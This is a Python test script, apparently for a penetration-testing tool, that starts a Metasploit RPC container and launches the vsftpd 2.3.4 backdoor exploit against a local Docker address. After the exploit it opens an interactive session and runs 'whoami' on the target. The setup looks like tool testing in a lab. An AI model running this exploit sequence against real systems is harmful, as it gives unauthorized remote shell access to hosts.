import asyncio
import os
import sys

sys.path.insert(0, os.path.abspath("."))
from hercules.core.config import HerculesConfig
from hercules.core.docker_manager import DockerManager

async def test_msf_session():
    target_ip = "172.17.0.2"
    print(f"[*] Target IP: {target_ip}")
    config = HerculesConfig()
    docker = DockerManager(config)
    
    print("[*] Starting Docker Container (this will take 5-10 minutes for bootstrap)...")
    await docker.start_container()
    
    print("[*] Waiting for msfrpcd to start...")
    try:
        client = await docker.wait_for_msfrpcd()
        print("[+] Connected to msfrpcd successfully!")
    except Exception as e:
        print(f"[-] Failed to connect to msfrpcd: {e}")
        await docker.stop_container()
        sys.exit(1)
        
    print(f"[*] Running exploit against {target_ip}...")
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 21
    
    job = exploit.execute(payload='cmd/unix/interact')
    print(f"[*] Exploit executed, job ID: {job['job_id']}")
    
    print("[*] Waiting for session...")
    await asyncio.sleep(10)
    
    sessions = client.sessions.list
    if not sessions:
        print("[-] No sessions found!")
    else:
        print(f"[+] Active sessions: {sessions}")
        for session_id in sessions.keys():
            print(f"[*] Interacting with session {session_id}...")
            shell = client.sessions.session(str(session_id))
            shell.write('whoami\n')
            await asyncio.sleep(2)
            out = shell.read()
            print(f"[+] Output: {out}")
            
    print("[*] Tearing down container...")
    await docker.stop_container()

if __name__ == "__main__":
    asyncio.run(test_msf_session())
